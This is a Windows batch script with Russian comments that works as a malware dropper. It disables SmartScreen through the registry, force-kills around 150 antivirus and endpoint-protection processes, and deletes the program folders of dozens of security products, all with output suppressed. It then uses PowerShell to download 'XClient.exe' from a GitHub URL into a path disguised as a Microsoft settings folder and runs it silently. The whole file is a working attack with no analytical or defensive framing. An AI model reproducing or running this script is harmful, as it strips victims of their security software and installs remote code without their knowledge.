��&cls
@echo off
setlocal

:: Отключаем SmartScreen (без отображения окон)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SmartScreen" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1

:: Убиваем сторонние процессы
@echo off
:: 360 [2]
set "process150=QHWatchdog.exe"
set "process151=QHSafeTray.exe"
set "process152=QHSafeMain.exe"
set "process153=QHActiveDefense.exe"
set "process154=PromoUtil.exe"

:: Avast
set "process1=AvastUI.exe"
set "process2=AvastSvc.exe"
set "process3=AvastEmUpdate.exe"

:: AVG
set "process4=AVGUI.exe"
set "process5=AVGSvc.exe"
set "process6=AVGEmUpdate.exe"

:: Norton Security
set "process7=NortonSecurity.exe"
set "process8=Norton.exe"
set "process9=NortonService.exe"

:: McAfee
set "process10=McAfee.exe"
set "process11=McUICnt.exe"
set "process12=McNASvc.exe"

:: Avira
set "process13=Avira.ServiceHost.exe"
set "process14=Avira.Systray.exe"
set "process15=Avira.OptimizerHost.exe"

:: Panda Security
set "process16=PSUAMain.exe"
set "process17=PSUAService.exe"
set "process18=PSUAScheduler.exe"

:: 360 Total Security
set "process19=360tray.exe"
set "process20=360sd.exe"
set "process21=360rp.exe"

:: Kaspersky
set "process22=avp.exe"
set "process23=avpui.exe"
set "process24=ksde.exe"

:: Dr.Web
set "process25=dwengine.exe"
set "process26=dwservice.exe"
set "process27=dwscanner.exe"

:: Windows Defender
set "process28=MsMpEng.exe"
set "process29=NisSrv.exe"
set "process30=MpCmdRun.exe"

:: Quick Heal
set "process31=QHWatchdog.exe"
set "process32=QHSafeTray.exe"
set "process33=QHSafeMain.exe"
set "process34=QHActiveDefense.exe"
set "process35=PromoUtil.exe"

:: VIPRE
set "process36=SBAMSvc.exe"
set "process37=SBAMTray.exe"
set "process38=SBAMUpdater.exe"

:: Bitdefender
set "process39=bdagent.exe"
set "process40=bdservicehost.exe"
set "process41=bdredline.exe"

:: ESET
set "process42=egui.exe"
set "process43=ekrn.exe"
set "process44=ecls.exe"

:: Sophos
set "process45=SophosUI.exe"
set "process46=SophosService.exe"
set "process47=SophosSafestore64.exe"

:: F-Secure
set "process48=FSMA32.exe"
set "process49=FSSM32.exe"
set "process50=FSHDLL32.exe"

:: Comodo
set "process51=cmdagent.exe"
set "process52=cistray.exe"
set "process53=cis.exe"

:: Malwarebytes
set "process54=MBAMService.exe"
set "process55=MBAMTray.exe"
set "process56=MBAM.exe"

:: Emsisoft
set "process57=EmsisoftAntiMalware.exe"
set "process58=a2service.exe"
set "process59=a2start.exe"

:: Webroot
set "process60=WRSA.exe"
set "process61=WRSVC.exe"
set "process62=WRSSSDK.exe"

:: Trend Micro
set "process63=TmProxy.exe"
set "process64=TmCCSF.exe"
set "process65=TmPfw.exe"

:: G DATA
set "process66=AVK.exe"
set "process67=AVKWCtl.exe"
set "process68=AVKCl.exe"

:: ZoneAlarm
set "process69=zatray.exe"
set "process70=zlclient.exe"
set "process71=vsmon.exe"

:: Ad-Aware
set "process72=AdAwareService.exe"
set "process73=AdAwareTray.exe"
set "process74=AdAware.exe"

:: Cylance
set "process75=CylanceSvc.exe"
set "process76=CylanceUI.exe"
set "process77=CylanceOptics.exe"

:: CrowdStrike
set "process78=CSFalconService.exe"
set "process79=CSFalconUI.exe"
set "process80=CSFalconContainer.exe"

:: HitmanPro
set "process81=HitmanPro.exe"
set "process82=HitmanPro.Alert.exe"
set "process83=HitmanPro.Scheduler.exe"

:: TotalAV
set "process84=TotalAV.exe"
set "process85=TotalAVService.exe"
set "process86=TotalAVUpdater.exe"

:: BullGuard
set "process87=BullGuard.exe"
set "process88=BullGuardCore.exe"
set "process89=BullGuardUpdate.exe"

:: K7 Computing
set "process90=K7TSecurity.exe"
set "process91=K7TSMain.exe"
set "process92=K7TSUpdater.exe"

:: TrustPort
set "process93=TPAntivirus.exe"
set "process94=TPAVSvc.exe"
set "process95=TPAVUpdater.exe"

:: Zillya
set "process96=ZillyaAntivirus.exe"
set "process97=ZillyaService.exe"
set "process98=ZillyaUpdater.exe"

:: IObit
set "process99=IObitMalwareFighter.exe"
set "process100=IMFService.exe"
set "process101=IMFTray.exe"

:: Rising
set "process102=Rav.exe"
set "process103=RavMonD.exe"
set "process104=RavUpdater.exe"

:: Fortinet
set "process105=FortiClient.exe"
set "process106=FortiTray.exe"
set "process107=FortiSrv.exe"

:: ClamWin
set "process108=ClamWin.exe"
set "process109=ClamTray.exe"
set "process110=ClamScan.exe"

:: GridinSoft
set "process111=GridinSoft.exe"
set "process112=GridinSoftService.exe"
set "process113=GridinSoftUpdater.exe"

:: Cybereason
set "process114=CybereasonRansomFree.exe"
set "process115=CybereasonService.exe"
set "process116=CybereasonUI.exe"

:: Immunet
set "process117=Immunet.exe"
set "process118=ImmunetService.exe"
set "process119=ImmunetUpdater.exe"

:: Panda Dome
set "process120=PandaDome.exe"
set "process121=PandaDomeService.exe"
set "process122=PandaDomeUpdater.exe"

:: Sophos Home
set "process123=SophosHome.exe"
set "process124=SophosHomeService.exe"
set "process125=SophosHomeUpdater.exe"

:: Cisco Secure Endpoint
set "process126=AMPForEndpoints.exe"
set "process127=AMPForEndpointsService.exe"
set "process128=AMPForEndpointsUI.exe"

:: Symantec Endpoint Protection
set "129=ccSvcHst.exe"
set "130=ccApp.exe"
set "131=ccSetMgr.exe"

:: Bitdefender GravityZone
set "132=bdagent.exe"
set "133=bdservicehost.exe"
set "134=bdredline.exe"

:: Kaspersky Endpoint Security
set "135=kes.exe"
set "136=kesl.exe"
set "137=keslui.exe"

:: ESET Endpoint Antivirus
set "138=egui.exe"
set "139=ekrn.exe"
set "140=ecls.exe"

:: F-Secure Business Suite
set "141=FSMA32.exe"
set "142=FSSM32.exe"
set "143=FSHDLL32.exe"

:: McAfee Endpoint Security
set "144=McAfee.exe"
set "145=McUICnt.exe"
set "146=McNASvc.exe"

:: Norton Small Business
set "147=Norton.exe"
set "148=NortonService.exe"
set "149=NortonSecurity.exe"

:: Завершение процессов
taskkill /im "%process150%" /f > nul 2>&1 & 
taskkill /im "%process151%" /f > nul 2>&1 & 
taskkill /im "%process152%" /f > nul 2>&1 & 
taskkill /im "%process153%" /f > nul 2>&1 & 
taskkill /im "%process154%" /f > nul 2>&1
taskkill /im "%process1%" /f > nul 2>&1 & 
taskkill /im "%process2%" /f > nul 2>&1 & 
taskkill /im "%process3%" /f > nul 2>&1 & 
taskkill /im "%process4%" /f > nul 2>&1 & 
taskkill /im "%process5%" /f > nul 2>&1 & 
taskkill /im "%process6%" /f > nul 2>&1 & 
taskkill /im "%process7%" /f > nul 2>&1 & 
taskkill /im "%process8%" /f > nul 2>&1 & 
taskkill /im "%process9%" /f > nul 2>&1 & 
taskkill /im "%process10%" /f > nul 2>&1 & 
taskkill /im "%process11%" /f > nul 2>&1 & 
taskkill /im "%process12%" /f > nul 2>&1 & 
taskkill /im "%process13%" /f > nul 2>&1 & 
taskkill /im "%process14%" /f > nul 2>&1 & 
taskkill /im "%process15%" /f > nul 2>&1 & 
taskkill /im "%process16%" /f > nul 2>&1 & 
taskkill /im "%process17%" /f > nul 2>&1 & 
taskkill /im "%process18%" /f > nul 2>&1 & 
taskkill /im "%process19%" /f > nul 2>&1 & 
taskkill /im "%process20%" /f > nul 2>&1 & 
taskkill /im "%process21%" /f > nul 2>&1 & 
taskkill /im "%process22%" /f > nul 2>&1 & 
taskkill /im "%process23%" /f > nul 2>&1 & 
taskkill /im "%process24%" /f > nul 2>&1 & 
taskkill /im "%process25%" /f > nul 2>&1 & 
taskkill /im "%process26%" /f > nul 2>&1 & 
taskkill /im "%process27%" /f > nul 2>&1 & 
taskkill /im "%process28%" /f > nul 2>&1 & 
taskkill /im "%process29%" /f > nul 2>&1 & 
taskkill /im "%process30%" /f > nul 2>&1 & 
taskkill /im "%process31%" /f > nul 2>&1 & 
taskkill /im "%process32%" /f > nul 2>&1 & 
taskkill /im "%process33%" /f > nul 2>&1 & 
taskkill /im "%process34%" /f > nul 2>&1 & 
taskkill /im "%process35%" /f > nul 2>&1 & 
taskkill /im "%process36%" /f > nul 2>&1 & 
taskkill /im "%process37%" /f > nul 2>&1 & 
taskkill /im "%process38%" /f > nul 2>&1 & 
taskkill /im "%process39%" /f > nul 2>&1 & 
taskkill /im "%process40%" /f > nul 2>&1 & 
taskkill /im "%process41%" /f > nul 2>&1 & 
taskkill /im "%process42%" /f > nul 2>&1 & 
taskkill /im "%process43%" /f > nul 2>&1 & 
taskkill /im "%process44%" /f > nul 2>&1 & 
taskkill /im "%process45%" /f > nul 2>&1 & 
taskkill /im "%process46%" /f > nul 2>&1 & 
taskkill /im "%process47%" /f > nul 2>&1 & 
taskkill /im "%process48%" /f > nul 2>&1 & 
taskkill /im "%process49%" /f > nul 2>&1 & 
taskkill /im "%process50%" /f > nul 2>&1 & 
taskkill /im "%process51%" /f > nul 2>&1 & 
taskkill /im "%process52%" /f > nul 2>&1 & 
taskkill /im "%process53%" /f > nul 2>&1 & 
taskkill /im "%process54%" /f > nul 2>&1 & 
taskkill /im "%process55%" /f > nul 2>&1 & 
taskkill /im "%process56%" /f > nul 2>&1 & 
taskkill /im "%process57%" /f > nul 2>&1 & 
taskkill /im "%process58%" /f > nul 2>&1 & 
taskkill /im "%process59%" /f > nul 2>&1 & 
taskkill /im "%process60%" /f > nul 2>&1 & 
taskkill /im "%process61%" /f > nul 2>&1 & 
taskkill /im "%process62%" /f > nul 2>&1 & 
taskkill /im "%process63%" /f > nul 2>&1 & 
taskkill /im "%process64%" /f > nul 2>&1 & 
taskkill /im "%process65%" /f > nul 2>&1 & 
taskkill /im "%process66%" /f > nul 2>&1 & 
taskkill /im "%process67%" /f > nul 2>&1 & 
taskkill /im "%process68%" /f > nul 2>&1 & 
taskkill /im "%process69%" /f > nul 2>&1 & 
taskkill /im "%process70%" /f > nul 2>&1 & 
taskkill /im "%process71%" /f > nul 2>&1 & 
taskkill /im "%process72%" /f > nul 2>&1 & 
taskkill /im "%process73%" /f > nul 2>&1 & 
taskkill /im "%process74%" /f > nul 2>&1 & 
taskkill /im "%process75%" /f > nul 2>&1 & 
taskkill /im "%process76%" /f > nul 2>&1 & 
taskkill /im "%process77%" /f > nul 2>&1 & 
taskkill /im "%process78%" /f > nul 2>&1 & 
taskkill /im "%process79%" /f > nul 2>&1 & 
taskkill /im "%process80%" /f > nul 2>&1 & 
taskkill /im "%process81%" /f > nul 2>&1 & 
taskkill /im "%process82%" /f > nul 2>&1 & 
taskkill /im "%process83%" /f > nul 2>&1 & 
taskkill /im "%process84%" /f > nul 2>&1 & 
taskkill /im "%process85%" /f > nul 2>&1 & 
taskkill /im "%process86%" /f > nul 2>&1 & 
taskkill /im "%process87%" /f > nul 2>&1 & 
taskkill /im "%process88%" /f > nul 2>&1 & 
taskkill /im "%process89%" /f > nul 2>&1 & 
taskkill /im "%process90%" /f > nul 2>&1 & 
taskkill /im "%process91%" /f > nul 2>&1 & 
taskkill /im "%process92%" /f > nul 2>&1 & 
taskkill /im "%process93%" /f > nul 2>&1 & 
taskkill /im "%process94%" /f > nul 2>&1 & 
taskkill /im "%process95%" /f > nul 2>&1 & 
taskkill /im "%process96%" /f > nul 2>&1 & 
taskkill /im "%process97%" /f > nul 2>&1 & 
taskkill /im "%process98%" /f > nul 2>&1 & 
taskkill /im "%process99%" /f > nul 2>&1 & 
taskkill /im "%process100%" /f > nul 2>&1 & 
taskkill /im "%process101%" /f > nul 2>&1 & 
taskkill /im "%process102%" /f > nul 2>&1 & 
taskkill /im "%process103%" /f > nul 2>&1 & 
taskkill /im "%process104%" /f > nul 2>&1 & 
taskkill /im "%process105%" /f > nul 2>&1 & 
taskkill /im "%process106%" /f > nul 2>&1 & 
taskkill /im "%process107%" /f > nul 2>&1 & 
taskkill /im "%process108%" /f > nul 2>&1 & 
taskkill /im "%process109%" /f > nul 2>&1 & 
taskkill /im "%process110%" /f > nul 2>&1 & 
taskkill /im "%process111%" /f > nul 2>&1 & 
taskkill /im "%process112%" /f > nul 2>&1 & 
taskkill /im "%process113%" /f > nul 2>&1 & 
taskkill /im "%process114%" /f > nul 2>&1 & 
taskkill /im "%process115%" /f > nul 2>&1 & 
taskkill /im "%process116%" /f > nul 2>&1 & 
taskkill /im "%process117%" /f > nul 2>&1 & 
taskkill /im "%process118%" /f > nul 2>&1 & 
taskkill /im "%process119%" /f > nul 2>&1 & 
taskkill /im "%process120%" /f > nul 2>&1 & 
taskkill /im "%process121%" /f > nul 2>&1 & 
taskkill /im "%process122%" /f > nul 2>&1 & 
taskkill /im "%process123%" /f > nul 2>&1 & 
taskkill /im "%process124%" /f > nul 2>&1 & 
taskkill /im "%process125%" /f > nul 2>&1 & 
taskkill /im "%process126%" /f > nul 2>&1 & 
taskkill /im "%process127%" /f > nul 2>&1 & 
taskkill /im "%process128%" /f > nul 2>&1 & 
taskkill /im "%process129%" /f > nul 2>&1 & 
taskkill /im "%process130%" /f > nul 2>&1 & 
taskkill /im "%process131%" /f > nul 2>&1 & 
taskkill /im "%process132%" /f > nul 2>&1 & 
taskkill /im "%process133%" /f > nul 2>&1 & 
taskkill /im "%process134%" /f > nul 2>&1 & 
taskkill /im "%process135%" /f > nul 2>&1 & 
taskkill /im "%process136%" /f > nul 2>&1 & 
taskkill /im "%process137%" /f > nul 2>&1 & 
taskkill /im "%process138%" /f > nul 2>&1 & 
taskkill /im "%process139%" /f > nul 2>&1 & 
taskkill /im "%process140%" /f > nul 2>&1 & 
taskkill /im "%process141%" /f > nul 2>&1 & 
taskkill /im "%process142%" /f > nul 2>&1 & 
taskkill /im "%process143%" /f > nul 2>&1 & 
taskkill /im "%process144%" /f > nul 2>&1 & 
taskkill /im "%process145%" /f > nul 2>&1 & 
taskkill /im "%process146%" /f > nul 2>&1 & 
taskkill /im "%process147%" /f > nul 2>&1 & 
taskkill /im "%process148%" /f > nul 2>&1 & 
taskkill /im "%process149%" /f > nul 2>&1

:: Удаляем файлы и папки антивирусов (без отображения окон).
for %%P in (
"C:\Program Files\AVAST Software\Avast"
"C:\Program Files (x86)\AVG\Antivirus"
"C:\Program Files\Norton Security"
"C:\Program Files\McAfee\MSC"
"C:\Program Files (x86)\Avira\Antivirus"
"C:\Program Files (x86)\Panda Security\Panda Security Protection"
"C:\Program Files (x86)\360\Total Security"
"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security"
"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security"
"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free"
"C:\Program Files\Dr.Web"
"C:\Program Files\Windows Defender"
"C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
"C:\Program Files (x86)\VIPRE"
"C:\Program Files\Bitdefender\Bitdefender Antivirus Plus"
"C:\Program Files\Bitdefender\Bitdefender Antivirus Free"
"C:\Program Files\ESET\ESET NOD32 Antivirus"
"C:\Program Files (x86)\Sophos\Sophos Anti-Virus"
"C:\Program Files (x86)\F-Secure\Anti-Virus"
"C:\Program Files (x86)\Comodo\Comodo Antivirus"
"C:\Program Files\Malwarebytes\Anti-Malware"
"C:\Program Files (x86)\Emsisoft Anti-Malware"
"C:\Program Files (x86)\Webroot"
"C:\Program Files (x86)\Trend Micro\Security Agent"
"C:\Program Files (x86)\G DATA\Antivirus"
"C:\Program Files (x86)\ZoneAlarm"
"C:\Program Files (x86)\Ad-Aware Antivirus"
"C:\Program Files\Cylance\Desktop"
"C:\Program Files\CrowdStrike"
"C:\Program Files (x86)\AVAST Software\Cleanup"
"C:\Program Files (x86)\Avira\System Speedup"
"C:\Program Files\HitmanPro"
"C:\Program Files\TotalAV"
"C:\Program Files\BullGuard"
"C:\Program Files\ESET\ESET Smart Security"
"C:\Program Files (x86)\K7 Computing\K7 Antivirus"
"C:\Program Files (x86)\TrustPort\Antivirus"
"C:\Program Files (x86)\Zillya\Antivirus"
"C:\Program Files (x86)\IObit\IObit Malware Fighter"
"C:\Program Files (x86)\IObit\Advanced SystemCare"
"C:\Program Files (x86)\Rising\Antivirus"
"C:\Program Files\Fortinet\FortiClient"
"C:\Program Files (x86)\ClamWin\bin"
"C:\Program Files (x86)\GridinSoft Anti-Malware"
"C:\Program Files (x86)\Cybereason"
"C:\Program Files (x86)\Immunet"
"C:\Program Files (x86)\Panda Dome"
"C:\Program Files (x86)\AVAST Software\Browser"
"C:\Program Files (x86)\AVG\Browser"
"C:\Program Files (x86)\Sophos\Sophos Home"
"C:\Program Files\Cisco\Cisco Secure Endpoint"
"C:\Program Files\Symantec\Symantec Endpoint Protection"
"C:\Program Files\AVAST Software\Business"
"C:\Program Files\AVG\Business"
"C:\Program Files\Bitdefender\GravityZone"
"C:\Program Files\Kaspersky Lab\Kaspersky Endpoint Security"
"C:\Program Files\ESET\ESET Endpoint Antivirus"
"C:\Program Files\F-Secure\Business Suite"
"C:\Program Files\McAfee\Endpoint Security"
"C:\Program Files\Norton Small Business"
) do (
    if exist "%%~P" (
        del /F /S /Q "%%~P" >nul 2>&1
    )
)

:: Удаляем папки антивирусов (без отображения окон).
for %%D in (
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
    "C:\Program Files\AVG\Browser\Application"
) do (
    if exist "%%~D" (
        rd /S /Q "%%~D" >nul 2>&1
    )
)

@echo off

:: Создать директорию, если она не существует
mkdir "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount" >nul 2>&1

:: Детали скачиваемого исполняемого файла
set "EXE_URL=https://github.com/ScifDif/Tool/raw/main/XClient.exe"
set "EXE_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\Xclient.exe"

:: Скачать исполняемый файл
powershell -Command "try { (New-Object System.Net.WebClient).DownloadFile('%EXE_URL%', '%EXE_PATH%') } catch { exit /b 1 }" >nul 2>&1

:: Запустить исполняемый файл
start "" "%EXE_PATH%" >nul 2>&1

exit